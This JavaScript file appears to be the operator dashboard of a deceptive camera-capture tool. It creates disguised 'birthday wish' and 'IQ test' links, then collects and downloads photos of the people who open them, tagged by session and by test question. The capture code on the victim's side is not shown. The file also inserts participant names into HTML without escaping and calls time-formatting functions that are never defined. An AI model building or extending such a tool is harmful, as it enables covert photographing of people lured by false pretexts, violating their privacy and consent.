const statusEl = document.getElementById('status');
const feed = document.getElementById('feed');
const generateLinkBtn = document.getElementById('generateLinkBtn');
const sessionNameInput = document.getElementById('sessionName');
const linkDisplay = document.getElementById('linkDisplay');
const generatedLink = document.getElementById('generatedLink');
const copyLinkBtn = document.getElementById('copyLinkBtn');
const activeSessionsCount = document.getElementById('activeSessionsCount');
const totalImagesCount = document.getElementById('totalImagesCount');
const connectedUsersCount = document.getElementById('connectedUsersCount');

// IQ Test elements
const generateIQTestBtn = document.getElementById('generateIQTestBtn');
const iqTestNameInput = document.getElementById('iqTestName');
const iqLinkDisplay = document.getElementById('iqLinkDisplay');
const generatedIQLink = document.getElementById('generatedIQLink');
const copyIQLinkBtn = document.getElementById('copyIQLinkBtn');
const iqSessionsList = document.getElementById('iqSessionsList');
const iqPhotoFeed = document.getElementById('iqPhotoFeed');

let ws = null;
let totalImages = 0;
let activeSessions = new Set();
let connectedUsers = 0;
let iqSessions = new Map(); // Store IQ test sessions

function connectWebSocket() {
  ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host);
  
  ws.addEventListener('open', () => {
    statusEl.textContent = 'Connected to server';
    statusEl.className = 'status connected';
    ws.send(JSON.stringify({ type: 'register', role: 'admin' }));
  });

  ws.addEventListener('message', (ev) => {
    try {
      const data = JSON.parse(ev.data);
      
      if (data.type === 'image') {
        handleNewImage(data);
      } else if (data.type === 'stats') {
        updateStats(data);
      } else if (data.type === 'user_connected') {
        connectedUsers++;
        updateStatsDisplay();
      } else if (data.type === 'user_disconnected') {
        connectedUsers = Math.max(0, connectedUsers - 1);
        updateStatsDisplay();
      } else if (data.type === 'iq_session_created') {
        console.log('IQ session created:', data);
        handleIQSessionCreated(data);
      } else if (data.type === 'iq_photo_captured') {
        console.log('IQ photo captured:', data);
        handleIQPhotoCapture(data);
      } else if (data.type === 'iq_test_completed') {
        console.log('IQ test completed:', data);
        handleIQTestCompleted(data);
      } else if (data.type === 'iq_session_active') {
        console.log('IQ session active:', data);
        // Handle active session notification
        if (!iqSessions.has(data.sessionId)) {
          iqSessions.set(data.sessionId, {
            id: data.sessionId,
            participantName: data.participantName,
            status: data.status,
            created: Date.now(),
            photoCount: 0
          });
          updateIQSessionsList();
        }
      }
    } catch (e) {
      console.error('Failed to parse message:', e);
    }
  });

  ws.addEventListener('close', () => {
    statusEl.textContent = 'Disconnected from server';
    statusEl.className = 'status disconnected';
    setTimeout(connectWebSocket, 3000);
  });

  ws.addEventListener('error', () => {
    statusEl.textContent = 'Connection error';
    statusEl.className = 'status disconnected';
  });
}

function handleNewImage(data) {
  const imageCard = document.createElement('div');
  imageCard.className = 'image-card';
  
  const img = document.createElement('img');
  img.src = data.payload;
  img.alt = 'User capture';
  
  const meta = document.createElement('div');
  meta.className = 'image-meta';
  
  const userDiv = document.createElement('div');
  userDiv.className = 'user';
  userDiv.textContent = `Session: ${data.sessionId || 'Unknown'}`;
  
  const timeDiv = document.createElement('div');
  timeDiv.className = 'time';
  timeDiv.textContent = new Date(data.time).toLocaleString();
  
  const downloadBtn = document.createElement('button');
  downloadBtn.className = 'btn btn-secondary btn-small';
  downloadBtn.textContent = 'Download';
  downloadBtn.addEventListener('click', () => {
    const a = document.createElement('a');
    a.href = data.payload;
    a.download = `${data.sessionId || 'session'}-${Date.now()}.png`;
    document.body.appendChild(a);
    a.click();
    a.remove();
  });
  
  meta.appendChild(userDiv);
  meta.appendChild(timeDiv);
  meta.appendChild(downloadBtn);
  
  imageCard.appendChild(img);
  imageCard.appendChild(meta);
  
  feed.prepend(imageCard);
  
  // Update stats
  totalImages++;
  if (data.sessionId) {
    activeSessions.add(data.sessionId);
  }
  updateStatsDisplay();
}

function updateStats(data) {
  if (data.totalImages !== undefined) totalImages = data.totalImages;
  if (data.activeSessions !== undefined) activeSessions = new Set(data.activeSessions);
  if (data.connectedUsers !== undefined) connectedUsers = data.connectedUsers;
  updateStatsDisplay();
}

function updateStatsDisplay() {
  activeSessionsCount.textContent = activeSessions.size;
  totalImagesCount.textContent = totalImages;
  connectedUsersCount.textContent = connectedUsers;
}

function generateSessionId() {
  // Generate a short, professional 6-character code (like BW4K9P)
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

generateLinkBtn.addEventListener('click', () => {
  const sessionName = sessionNameInput.value.trim() || 'Birthday Celebration';
  const sessionId = generateSessionId();
  const baseUrl = location.protocol + '//' + location.host;
  const link = `${baseUrl}/wish/${sessionId}`;
  
  generatedLink.textContent = link;
  linkDisplay.style.display = 'block';
  
  // Clear the session name input for next use
  sessionNameInput.value = '';
  
  // Send session creation to server
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'create_session',
      sessionId: sessionId,
      sessionName: sessionName
    }));
  }
});

copyLinkBtn.addEventListener('click', async () => {
  try {
    await navigator.clipboard.writeText(generatedLink.textContent);
    copyLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyLinkBtn.textContent = 'Copy Link';
    }, 2000);
  } catch (err) {
    // Fallback for older browsers
    const textArea = document.createElement('textarea');
    textArea.value = generatedLink.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
    copyLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyLinkBtn.textContent = 'Copy Link';
    }, 2000);
  }
});

// IQ Test Link Generation
generateIQTestBtn.addEventListener('click', () => {
  const testName = iqTestNameInput.value.trim() || 'IQ Test Participant';
  const sessionId = generateSessionId();
  const baseUrl = location.protocol + '//' + location.host;
  const link = `${baseUrl}/iqtest/${sessionId}`;
  
  generatedIQLink.textContent = link;
  iqLinkDisplay.style.display = 'block';
  
  // Clear the test name input for next use
  iqTestNameInput.value = '';
  
  // Send IQ test session creation to server
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({
      type: 'create_iq_session',
      sessionId: sessionId,
      participantName: testName
    }));
  }
});

copyIQLinkBtn.addEventListener('click', async () => {
  try {
    await navigator.clipboard.writeText(generatedIQLink.textContent);
    copyIQLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyIQLinkBtn.textContent = 'Copy IQ Link';
    }, 2000);
  } catch (err) {
    // Fallback for older browsers
    const textArea = document.createElement('textarea');
    textArea.value = generatedIQLink.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
    copyIQLinkBtn.textContent = 'Copied!';
    setTimeout(() => {
      copyIQLinkBtn.textContent = 'Copy IQ Link';
    }, 2000);
  }
});

// IQ Test Handlers
function handleIQSessionCreated(data) {
  iqSessions.set(data.sessionId, {
    id: data.sessionId,
    participantName: data.participantName,
    status: 'active',
    created: Date.now(),
    photoCount: 0
  });
  updateIQSessionsList();
}

function handleIQPhotoCapture(data) {
  console.log('Handling IQ photo capture:', {
    sessionId: data.sessionId,
    photoType: data.photoType,
    hasPhoto: !!data.photo,
    iqSessionsSize: iqSessions.size,
    iqPhotoFeedExists: !!iqPhotoFeed
  });
  
  // Update session photo count
  if (iqSessions.has(data.sessionId)) {
    iqSessions.get(data.sessionId).photoCount++;
    updateIQSessionsList();
    console.log('Updated session photo count');
  } else {
    console.log('Session not found in iqSessions:', data.sessionId);
    console.log('Available sessions:', Array.from(iqSessions.keys()));
  }
  
  // Add photo to feed
  const photoElement = createIQPhotoElement(data);
  console.log('Created photo element:', photoElement);
  
  if (iqPhotoFeed) {
    iqPhotoFeed.insertBefore(photoElement, iqPhotoFeed.firstChild);
    console.log('Photo added to feed, total photos now:', iqPhotoFeed.children.length);
    
    // Limit to 50 photos in feed
    while (iqPhotoFeed.children.length > 50) {
      iqPhotoFeed.removeChild(iqPhotoFeed.lastChild);
    }
  } else {
    console.error('iqPhotoFeed element not found!');
  }
}

function handleIQTestCompleted(data) {
  if (iqSessions.has(data.sessionId)) {
    const session = iqSessions.get(data.sessionId);
    session.status = 'completed';
    session.score = data.score;
    session.correctAnswers = data.correctAnswers;
    session.totalQuestions = data.totalQuestions;
    session.completedAt = Date.now();
    updateIQSessionsList();
  }
}

function updateIQSessionsList() {
  if (iqSessions.size === 0) {
    iqSessionsList.innerHTML = '<p style="color: #718096; text-align: center; padding: 2rem;">No active IQ test sessions</p>';
    return;
  }
  
  const sessionsArray = Array.from(iqSessions.values());
  iqSessionsList.innerHTML = sessionsArray.map(session => createIQSessionCard(session)).join('');
}

function createIQSessionCard(session) {
  const timeAgo = formatTimeAgo(session.created);
  const statusClass = session.status === 'completed' ? 'completed' : 'active';
  const scoreInfo = session.status === 'completed' 
    ? `<div class="info-item"><span>📊</span><span>Score: ${session.score} (${session.correctAnswers}/${session.totalQuestions})</span></div>`
    : '';
  
  return `
    <div class="iq-session-card">
      <div class="iq-session-header">
        <div class="iq-session-name">🧠 ${session.participantName}</div>
        <div class="iq-session-status ${statusClass}">${session.status}</div>
      </div>
      <div class="iq-session-info">
        <div class="info-item"><span>🆔</span><span>${session.id.substring(0, 8)}...</span></div>
        <div class="info-item"><span>⏰</span><span>${timeAgo}</span></div>
        <div class="info-item"><span>📸</span><span>${session.photoCount} photos</span></div>
        ${scoreInfo}
      </div>
    </div>
  `;
}

function createIQPhotoElement(data) {
  const div = document.createElement('div');
  div.className = 'iq-photo-card';
  
  const session = iqSessions.get(data.sessionId);
  const participantName = session ? session.participantName : 'Unknown';
  const questionInfo = data.currentQuestion !== undefined 
    ? `Question ${data.currentQuestion + 1}` 
    : 'Setup';
  
  div.innerHTML = `
    <img src="${data.photo}" alt="IQ Test Capture" style="width: 100%; height: 200px; object-fit: cover;">
    <div class="iq-photo-meta">
      <div class="participant">${participantName}</div>
      <div class="photo-type">${data.photoType}</div>
      <div class="time">${formatTime(data.timestamp)}</div>
      <div class="question-info">${questionInfo}</div>
    </div>
  `;
  
  return div;
}

// Initialize connection
connectWebSocket();
